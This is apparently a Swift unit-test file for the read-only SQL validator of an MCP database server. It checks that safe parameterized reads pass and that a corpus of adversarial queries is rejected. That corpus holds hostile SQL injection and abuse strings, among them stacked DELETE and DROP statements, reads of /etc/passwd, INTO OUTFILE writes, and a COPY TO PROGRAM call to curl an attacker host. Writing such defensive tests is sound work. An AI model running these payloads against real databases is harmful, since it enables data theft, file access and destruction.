import XCTest
@testable import BerryMCP
import BerryDriverSQLite

final class MCPReadPolicyTests: XCTestCase {
    private let policy = MCPReadPolicy()

    func testParameterizedSingleReadsAreAllowed() throws {
        let fixtures: [(MCPSQLDialect, String)] = [
            (.postgresql, "SELECT id, name FROM users WHERE id = $1"),
            (.mysql, "SELECT `semi;colon` FROM users WHERE id = ?"),
            (.sqlite, "WITH chosen AS (SELECT id FROM users WHERE name = :name) SELECT * FROM chosen"),
            (.postgresql, "VALUES ($1), ($2)"),
            (.sqlite, "PRAGMA table_info('users')"),
            (.mysql, "EXPLAIN SELECT * FROM users WHERE id = ?"),
            (.postgresql, "SELECT count(*), lower(name), coalesce(email, $1) FROM users WHERE id = $2"),
            (.sqlite, "SELECT json_extract(payload, '$.name') FROM events WHERE id = ?1"),
            (.mysql, "SELECT replace(name, ?, ?) FROM users WHERE id = ?"),
            (.mysql, "SELECT ':=' AS assignment_text"),
        ]
        for (dialect, sql) in fixtures { XCTAssertNoThrow(try policy.validate(sql, dialect: dialect), sql) }
    }

    func testCTEColumnListsAreRecognizedOnlyAtDeclarationSites() throws {
        let accepted = [
            "WITH c(id, name) AS (SELECT id, name FROM users) SELECT * FROM c",
            "WITH a(id) AS (SELECT id FROM users), b(value) AS (SELECT lower(name) FROM users) SELECT * FROM a, b",
            "WITH outer_cte(id) AS (WITH inner_cte(value) AS (SELECT lower(name) FROM users) SELECT value FROM inner_cte) SELECT * FROM outer_cte",
            "WITH RECURSIVE path(id) AS (SELECT id FROM nodes) SELECT * FROM path",
        ]
        for sql in accepted { XCTAssertNoThrow(try policy.validate(sql, dialect: .postgresql), sql) }

        let rejected = [
            "WITH c AS (SELECT 1, evil(payload) AS value FROM events) SELECT * FROM c",
            "WITH c AS (SELECT lower(name), evil(payload) FROM events) SELECT * FROM c",
            "WITH c AS (WITH d AS (SELECT evil(payload) FROM events) SELECT * FROM d) SELECT * FROM c",
        ]
        for sql in rejected { XCTAssertThrowsError(try policy.validate(sql, dialect: .postgresql), sql) }
    }

    func testQualifiedFunctionCallsFailClosedInEveryDialect() {
        let fixtures: [(MCPSQLDialect, String)] = [
            (.postgresql, "SELECT evil.lower(name) FROM users"),
            (.postgresql, "SELECT \"evil\".lower(name) FROM users"),
            (.postgresql, "SELECT evil.\"lower\"(name) FROM users"),
            (.mysql, "SELECT evil.lower(name) FROM users"),
            (.mysql, "SELECT `evil`.lower(name) FROM users"),
            (.mysql, "SELECT evil.`lower`(name) FROM users"),
            (.sqlite, "SELECT evil.lower(name) FROM users"),
            (.sqlite, "SELECT [evil].lower(name) FROM users"),
            (.sqlite, "SELECT evil.[lower](name) FROM users"),
        ]
        for (dialect, sql) in fixtures { XCTAssertThrowsError(try policy.validate(sql, dialect: dialect), sql) }
    }

    func testValidatedExecutableSQLPreservesDialectSyntaxExactly() throws {
        let fixtures: [(MCPSQLDialect, String, String)] = [
            (.postgresql, "  SELECT $1::text || 'x'  ; \n", "SELECT $1::text || 'x'"),
            (.sqlite, "\nSELECT ?1, json_extract(payload, '$.x')->>'name' FROM events\t", "SELECT ?1, json_extract(payload, '$.x')->>'name' FROM events"),
            (.mysql, " SELECT ? <=> value FROM records ", "SELECT ? <=> value FROM records"),
        ]
        for (dialect, sql, expected) in fixtures {
            XCTAssertEqual(try policy.validate(sql, dialect: dialect).normalizedSQL, expected)
        }
    }

    func testPostgresArrayBracketsCannotHideFunctions() {
        let fixtures = [
            "SELECT ARRAY[pg_read_file('/etc/passwd')]",
            "SELECT (ARRAY[pg_sleep(10)])[1]",
            "SELECT ARRAY[lo_import('/etc/hosts')]",
        ]
        for sql in fixtures { XCTAssertThrowsError(try policy.validate(sql, dialect: .postgresql), sql) }
    }

    func testMySQLRejectsBrackets() {
        XCTAssertThrowsError(try policy.validate("SELECT [load_file('/etc/passwd')]", dialect: .mysql))
    }

    func testSQLiteBracketIdentifiersStillWork() throws {
        XCTAssertNoThrow(try policy.validate("SELECT [id] FROM [orders]", dialect: .sqlite))
    }

    func testAdversarialCorpusIsDenied() {
        let fixtures: [(MCPSQLDialect, String)] = [
            (.postgresql, "WITH changed AS (UPDATE users SET admin = true RETURNING *) SELECT * FROM changed"),
            (.postgresql, "SELECT 1; DELETE FROM users"),
            (.mysql, "SELECT 1 /* harmless */; DROP TABLE users"),
            (.postgresql, "EXPLAIN ANALYZE SELECT * FROM users"),
            (.postgresql, "CALL rotate_keys()"),
            (.mysql, "EXECUTE prepared_write"),
            (.postgresql, "SELECT * INTO secrets_copy FROM secrets"),
            (.postgresql, "SELECT * FROM users FOR UPDATE"),
            (.postgresql, "SELECT * FROM users FOR KEY SHARE"),
            (.postgresql, "SELECT * FROM users FOR NO KEY UPDATE"),
            (.postgresql, "SELECT * FROM users FOR /* lock */ KEY SHARE"),
            (.mysql, "SELECT * FROM users FOR SHARE"),
            (.mysql, "SELECT * FROM users FOR /* lock */ SHARE"),
            (.mysql, "SELECT * FROM users LOCK IN SHARE MODE"),
            (.mysql, "SELECT @current := id FROM users"),
            (.mysql, "SELECT @current : /* assignment */ = id FROM users"),
            (.postgresql, "SELECT pg_read_file('/etc/passwd')"),
            (.postgresql, "SELECT * FROM dblink('host=x', 'DELETE FROM x')"),
            (.mysql, "SELECT load_file('/etc/passwd')"),
            (.mysql, "SELECT * FROM users INTO OUTFILE '/tmp/users'"),
            (.sqlite, "PRAGMA writable_schema = ON"),
            (.sqlite, "PRAGMA journal_mode(WAL)"),
            (.sqlite, "ATTACH DATABASE '/tmp/other.db' AS other"),
            (.postgresql, "SET search_path = public"),
            (.mysql, "USE other_database"),
            (.sqlite, "BEGIN TRANSACTION"),
            (.postgresql, "COMMIT"),
            (.mysql, "START TRANSACTION"),
            // G3 gate evidence (docs/mcp-server-compatibility.md): a
            // PostgreSQL `BEGIN READ ONLY` transaction does not by itself
            // block these. `set_config`, `pg_advisory_lock`, MySQL
            // `get_lock`, and `sleep` are already covered above as function
            // calls; these three are the remaining statement forms.
            (.postgresql, "SET TRANSACTION READ WRITE"),
            (.postgresql, "SET default_transaction_read_only = off"),
            (.postgresql, "COMMIT; DELETE FROM users"),
            (.sqlite, "VACUUM"),
            (.postgresql, "DO $$ BEGIN DELETE FROM users; END $$"),
            (.mysql, "REPLACE INTO users VALUES (1)"),
            (.sqlite, "INSERT OR REPLACE INTO users VALUES (1)"),
            (.postgresql, "SELECT nextval('secret_seq')"),
            (.postgresql, "COPY users TO PROGRAM 'curl attacker'"),
            (.mysql, "SELECT sleep(30)"),
            (.mysql, "/*!50000 DELETE FROM users */ SELECT 1"),
            (.mysql, "SELECT 1 /*!50000 INTO OUTFILE '/tmp/leak' */"),
            (.postgresql, "SELECT set_config('search_path', 'attacker', false)"),
            (.postgresql, "SELECT pg_advisory_lock(42)"),
            (.postgresql, "SELECT pg_terminate_backend(42)"),
            (.mysql, "SELECT get_lock('mcp', 30)"),
            (.sqlite, "SELECT load_extension('/tmp/evil')"),
            (.postgresql, "SELECT unreviewed_extension_function($1)"),
            (.postgresql, "SELECT \"unreviewed_extension_function\"($1)"),
            (.mysql, "SELECT `unreviewed_extension_function`(?)"),
            (.postgresql, "SELECT 'ambiguous\\\\'; DELETE FROM users; -- '"),
            (.mysql, "SELECT 1 /* outer /* */; DELETE FROM users */"),
            (.mysql, "SELECT 1 --not-a-comment; DELETE FROM users"),
            (.sqlite, "SELECT 1 /* outer /* */; DELETE FROM users */"),
            (.sqlite, "SELECT"),
            (.mysql, "VALUES"),
            (.sqlite, "WHATEVER SELECT 1"),
        ]
        for (dialect, sql) in fixtures { XCTAssertThrowsError(try policy.validate(sql, dialect: dialect), sql) }
    }

    func testNaivePrefixAuthorizationWouldFailTheAdversarialGate() {
        let bypasses = [
            "SELECT 1; DELETE FROM users",
            "SELECT * INTO OUTFILE '/tmp/leak' FROM users",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT unreviewed_extension_function(1)",
        ]
        for sql in bypasses {
            XCTAssertTrue(sql.uppercased().hasPrefix("SELECT"), "Fixture must demonstrate the naive-prefix weakness")
            XCTAssertThrowsError(try policy.validate(sql, dialect: .postgresql))
        }
    }

    func testCommentsAndQuotedSemicolonsCannotConfuseStatementBoundary() throws {
        XCTAssertNoThrow(try policy.validate("/* ; DELETE */ SELECT ';not a statement' AS value -- ; DROP\n", dialect: .postgresql))
        XCTAssertThrowsError(try policy.validate("SELECT 'safe;'; /* comment */ UPDATE users SET x=1", dialect: .postgresql))
        XCTAssertNoThrow(try policy.validate("SELECT $$ embedded ; UPDATE users $$", dialect: .postgresql))
    }

    func testMalformedInputFailsClosed() {
        for sql in ["", "-- only a comment", "SELECT 'unterminated", "SELECT (1", "/* open"] {
            XCTAssertThrowsError(try policy.validate(sql, dialect: .sqlite), sql)
        }
    }

    func testSQLiteSessionReadOnlyEnforcementRejectsWrite() async throws {
        let path = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString).path
        FileManager.default.createFile(atPath: path, contents: Data())
        defer { try? FileManager.default.removeItem(atPath: path) }
        let connection = try SQLiteConnection(path: path)
        for try await _ in connection.execute("CREATE TABLE users(id INTEGER)") {}
        for try await _ in connection.execute("PRAGMA query_only = ON") {}
        var observedRead = false
        for try await event in connection.execute("SELECT 42 AS answer") {
            if case .rows(let rows) = event, !rows.isEmpty { observedRead = true }
        }
        XCTAssertTrue(observedRead, "SQLite query_only must continue to permit reads")
        do {
            for try await _ in connection.execute("INSERT INTO users VALUES (1)") {}
            XCTFail("SQLite query_only session unexpectedly permitted a write")
        } catch {
            XCTAssertTrue(String(describing: error).lowercased().contains("readonly"))
        }
        await connection.close()
    }
}
